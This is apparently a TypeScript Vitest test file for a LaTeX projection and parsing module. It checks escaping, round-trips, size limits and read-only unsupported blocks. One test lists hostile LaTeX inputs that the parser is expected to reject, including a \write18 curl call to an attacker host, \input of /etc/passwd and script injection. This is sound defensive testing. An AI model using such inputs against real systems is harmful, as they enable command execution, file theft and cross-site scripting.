import { describe, expect, it } from 'vitest'

import {
  escapeLatexText,
  parseLatexParagraphSource,
  projectBlockToLatex,
  projectDocumentToLatex,
} from './latex-projection'

import type { DocumentBlockDetail } from '#/types/documents'

function block(overrides: Partial<DocumentBlockDetail> = {}): DocumentBlockDetail {
  return {
    id: 'block-1',
    stableKey: 'stable-1',
    ordinal: 0,
    blockType: 'paragraph',
    text: 'Canonical text',
    headingLevel: null,
    contentHash: 'hash',
    ...overrides,
  }
}

describe('LaTeX projection', () => {
  it('projects the canonical block order deterministically', () => {
    const blocks = [
      block({ blockType: 'heading', headingLevel: 1, text: 'Methods & results' }),
      block({ id: 'block-2', ordinal: 1, text: 'Cost is $5.' }),
    ]

    expect(projectDocumentToLatex(blocks)).toBe('\\section{Methods \\& results}\n\nCost is \\$5.')
    expect(projectDocumentToLatex(blocks)).toBe(projectDocumentToLatex(blocks))
  })

  it('round-trips generated canonical paragraph text without semantic loss', () => {
    const alphabet = 'abc XYZ 019\\{}#$%&_^~\n—é中'
    let seed = 7
    const next = () => {
      seed = (seed * 48_271) % 2_147_483_647
      return seed
    }

    for (let example = 0; example < 250; example += 1) {
      let text = ''
      const length = (next() % 80) + 1
      for (let index = 0; index < length; index += 1) {
        text += alphabet[next() % alphabet.length]
      }
      if (text.trim().length === 0) text += 'content'

      expect(parseLatexParagraphSource(escapeLatexText(text))).toEqual({ ok: true, text })
    }
  })

  it.each([
    ['shell execution', '\\write18{curl attacker.test}'],
    ['server file access', '\\input{/etc/passwd}'],
    ['network resources', '\\includegraphics{https://attacker.test/a.png}'],
    ['unsafe links', '\\href{javascript:alert(1)}{click}'],
    ['HTML injection', '\\html{<script>alert(1)</script>}'],
    ['executable macros', '\\newcommand{\\attack}{payload}'],
  ])('rejects %s with the command named in an actionable warning', (_case, source) => {
    const result = parseLatexParagraphSource(source)

    if (result.ok) throw new Error('Unsafe source was accepted.')
    expect(result.error).toMatch(/Unsupported LaTeX command \\/)
  })

  it('bounds source size before parsing', () => {
    const result = parseLatexParagraphSource('a'.repeat(120_001))

    expect(result).toEqual({
      ok: false,
      error: 'LaTeX source exceeds the 120,000 character safety limit.',
    })
  })

  it('preserves unsupported canonical blocks in explicit read-only source', () => {
    const projection = projectBlockToLatex(
      block({ blockType: 'unsupported', text: '[Image omitted]' }),
    )

    expect(projection.editable).toBe(false)
    expect(projection.source).toContain('REDLINE_UNSUPPORTED')
    expect(projection.source).toContain('[Image omitted]')
    expect(projection.warning).toMatch(/never silently discarded or compiled/)
  })
})
